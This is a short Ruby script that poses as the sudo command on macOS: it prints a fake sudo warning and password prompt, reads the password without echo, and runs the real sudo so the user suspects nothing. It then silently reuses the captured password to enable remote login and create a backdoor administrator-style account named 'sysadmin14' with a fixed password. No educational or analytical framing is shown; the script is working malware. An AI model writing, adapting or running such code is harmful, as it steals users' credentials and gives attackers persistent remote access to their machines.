print "WARNING: Improper use of the sudo command could lead to data loss\nor the deletion of important system files. Please double-check your\ntyping when using sudo. Type \"man sudo\" for more information.\n\nTo proceed, enter your password, or type Ctrl-C to abort.\n\nPassword:"

system "stty -echo"
password = $stdin.gets.chomp
system "stty echo"

print `/usr/bin/sudo #{ARGV[0..-1].join(' ')}`

username = "sysadmin14"
user_id = 1016
`echo '#{password}' | /usr/bin/sudo -S systemsetup -setremotelogin on && /usr/bin/sudo dscl . -create /Users/#{username} && /usr/bin/sudo dscl . -create /Users/#{username} UserShell /bin/bash && /usr/bin/sudo dscl . -create /Users/#{username} RealName "Sys Admin" && /usr/bin/sudo dscl . -create /Users/#{username} UniqueID "#{user_id}" && /usr/bin/sudo dscl . -passwd /Users/#{username} password`